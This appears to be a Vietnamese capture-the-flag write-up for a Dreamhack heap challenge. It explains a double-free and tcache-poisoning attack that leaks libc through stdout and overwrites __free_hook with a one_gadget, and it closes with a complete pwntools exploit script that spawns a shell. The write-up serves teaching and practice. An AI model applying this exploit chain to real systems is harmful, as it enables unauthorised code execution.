# Challenge: Tcache Poisoning

# Vấn đề
- [File challenge](https://github.com/haiwh07/CTFWriteUp/blob/main/dreamhack/tcache_poisoning/tcache_poison)
- Chương trình thực thi như sau, và khi input thứ tự hàm chương trình cũng sẽ thực thi hàm theo thứ tự:
```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned int size; // [rsp+8h] [rbp-18h] BYREF
  int size_4; // [rsp+Ch] [rbp-14h] BYREF
  void *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  buf = 0LL;
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  while ( 1 )
  {
    while ( 1 )
    {
      puts("1. Allocate");
      puts("2. Free");
      puts("3. Print");
      puts("4. Edit");
      __isoc99_scanf("%d", &size_4);
      if ( size_4 != 2 )
        break;
      free(buf);
    }
    if ( size_4 > 2 )
    {
      if ( size_4 == 3 )
      {
        printf("Content: %s", (const char *)buf);
      }
      else if ( size_4 == 4 )
      {
        printf("Edit chunk: ");
        read(0, buf, size - 1);
      }
    }
    else if ( size_4 == 1 )
    {
      printf("Size: ");
      __isoc99_scanf("%d", &size);
      buf = malloc(size);
      printf("Content: ");
      read(0, buf, size - 1);
    }
  }
}
```
- Checksec:
```
+ Arch:       amd64-64-little
+ RELRO:      Full RELRO
+ Stack:      No canary found
+ NX:         NX enabled
+ PIE:        No PIE (0x400000)
+ Stripped:   No
```

## Giải pháp
- Chương trình cho phép user tạo malloc và free malloc ở đầu buf, nhưng vấn đề là khi free không gắn địa chỉ malloc thành NULL, do đó có thể khai thác _Double Free_.
-  Xem qua hàm print của chương trình, thấy rằng ở lệnh printf(...) này có thể dùng để leak dữ liệu vì nó có thể đọc dữ liệu từ buf. Cùng với chall có dùng tới libc nên ta hướng tới việc leak nó.
> Leak libc bằng printf().
- Ở hàm edit, ta có thể dùng nó overwrite heap chunk theo ý ta muốn. Check sơ qua chương trình tôi thấy có __free_hook, do đó hướng giải quyết lúc này có thể là overwrite __free_hook thành one_gadget để lấy shell.
```
└─$ one_gadget libc-2.27.so
0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv

0xe54a8 execve("/bin/sh", r13, rbx)
constraints:
  [r13] == NULL || r13 == NULL || r13 is a valid argv
  [rbx] == NULL || rbx == NULL || rbx is a valid envp

0xe5622 execve("/bin/sh", rcx, rdx)
constraints:
  [rcx] == NULL || rcx == NULL || rcx is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```
> Overwrite __free_hook thành oneshot, sau đó thực thi free() để lấy shell.

## Quá trình
- Trước tiên ta cần leak libc, do đó check sơ qua GOT thì chương trình không có bất kì hàm nào, vậy nên hướng tiếp theo tôi check là .bss xem hàm stdout có chứa libc để leak hay không.
```
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/haiwh/CTF/dreamhack/tcache_poisoning/tcache_poison_patched:
GOT protection: Full RELRO | Found 0 GOT entries passing the filter
pwndbg> x/20xg 0x0000000000600fa0
0x600fa0:       0x0000000000600db0      0x0000000000000000
0x600fb0:       0x0000000000000000      0x0000710eb9097a30
0x600fc0 <puts@got.plt>:        0x0000710eb9080aa0      0x0000710eb9064f70
0x600fd0 <read@got.plt>:        0x0000710eb9110140      0x0000710eb9097140
0x600fe0 <setvbuf@got.plt>:     0x0000710eb90813d0      0x0000710eb907bfa0
0x600ff0:       0x0000710eb9021b10      0x0000000000000000
0x601000:       0x0000000000000000      0x0000000000000000
0x601010 <stdout@@GLIBC_2.2.5>: 0x0000710eb93ec760      0x0000000000000000
0x601020 <stdin@@GLIBC_2.2.5>:  0x0000710eb93eba00      0x0000000000000000
0x601030:       0x0000000000000000      0x0000000000000000
```
> Do stdout có chứa libc nên tôi dùng nó để leak.
- Đầu tiên cần thực thi Double Free bug trước rồi sau đó dùng hàm edit để overwrite heap chunk thành stdout (vì PIE tắt nên có thể dùng exe.sym['...']) bằng kỹ thuật _Tcache Poisoning_. Vì chương trình có thể khai thác Double Free mà cùng với đó chương trình có thể edit heap chunk lúc nó đang trong bins, vậy nên Tcache Poisoning ra đời.
> **Lưu ý:** Ở phần tạo malloc(1, b'') vì read(0, buf, size - 1) nên khi ta tạo malloc với size là 1 lúc này read sẽ là read(0), do đó khi tạo xong malloc nó không cần phải chờ nhận bất kì bytes nào để có thể chạy lệnh tiếp theo (tránh gặp lỗi **[vfprintf](https://stackoverflow.com/questions/24922735/file-pointer-set-to-null-after-fprintf)** do địa chỉ cần đọc NULL). Nếu tạo malloc_size > 1 lúc này sẽ gặp bug vừa nêu trước đó, và chương trình sẽ crash.
```
# Double free
allocate(16, b'AAAA')
free()
edit(b'A'*8)
free()
edit(p64(exe.sym['stdout']))

allocate(16, b'A')
allocate(1, b'')
print_func()

p.recvuntil(b'Content: ')
libc_leak = u64(p.recv(6).ljust(8, b'\0'))
libc.address = libc_leak - 0x3ec760
info("Libc leak: " + hex(libc_leak))
info("Libc base: " + hex(libc.address))
```
- Tiếp theo việc ta cần làm lúc này là tạo một malloc khác size với malloc trước đó để có thể khai thác lại Double Free. Nắm bắt thời cơ, ta tạo malloc kèm địa chỉ __free_hook để khi mà Double Free xong ta sẽ thay địa chỉ buf ở đầu thành __free_hook luôn.
> **Ghi chú:** Nếu tạo malloc cùng size và giá trị vào sẽ gặp lỗi **[munmap_chunk() invalid pointer](https://stackoverflow.com/questions/32118545/munmap-chunk-invalid-pointer)** bởi vì trước đó ta đã thay đổi buf thành một giá trị ngoài heap do đó khi thực ta sẽ gặp lỗi.
```
allocate(200, p64(libc.sym['__free_hook']))
allocate(200, b'CCCC')
free()
edit(b'A'*8)
free()
```
- Lúc này buf[0] đang là __free_hook để thay đổi dữ liệu bên trong ta chỉ cần dùng hàm edit để thay đổi dữ liệu bên trong chunk đó thành oneshot và free() ngay sau đó là ta sẽ có được shell.
```
oneshot = [0x4f432, 0xe54a8, 0xe5622, 0x10a41c]
one_gadget = libc.address + oneshot[0]
edit(p64(libc.sym['__free_hook']))
allocate(200, b'A')
# Gan buf la __free_hook roi thay gia tri thanh oneshot
allocate(200, p64(one_gadget))
free()
```

## Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('tcache_poison_patched', checksec=False)
libc = ELF('libc-2.27.so', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+158

        
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 20395)
else:
    p = process([exe.path])
GDB()

def allocate(size, content):
    sln(1)
    slna(b'Size: ', size)
    sla(b'Content: ', content)

def free():
    sln(2)

def print_func():
    sln(3)

def edit(chunk):
    sln(4)
    sla(b'chunk: ', chunk)

###########################
### STAGE 1: Leak libc ####
###########################
# Double free
allocate(16, b'AAAA')
free()
edit(b'A'*8)
free()
edit(p64(exe.sym['stdout']))

allocate(16, b'A')
allocate(1, b'')
print_func()

p.recvuntil(b'Content: ')
libc_leak = u64(p.recv(6).ljust(8, b'\0'))
libc.address = libc_leak - 0x3ec760
info("Libc leak: " + hex(libc_leak))
info("Libc base: " + hex(libc.address))

############################
### STAGE 2: Double free ###
############################
allocate(200, p64(libc.sym['__free_hook']))
allocate(200, b'CCCC')
free()
edit(b'A'*8)
free()

######################################################
### STAGE 3: Overwrite oneshot by tcache poisoning ###
######################################################
oneshot = [0x4f432, 0xe54a8, 0xe5622, 0x10a41c]
one_gadget = libc.address + oneshot[0]
edit(p64(libc.sym['__free_hook']))
allocate(200, b'A')
# Gan buf la __free_hook roi thay gia tri thanh oneshot
allocate(200, p64(one_gadget))
free()

p.interactive()
```
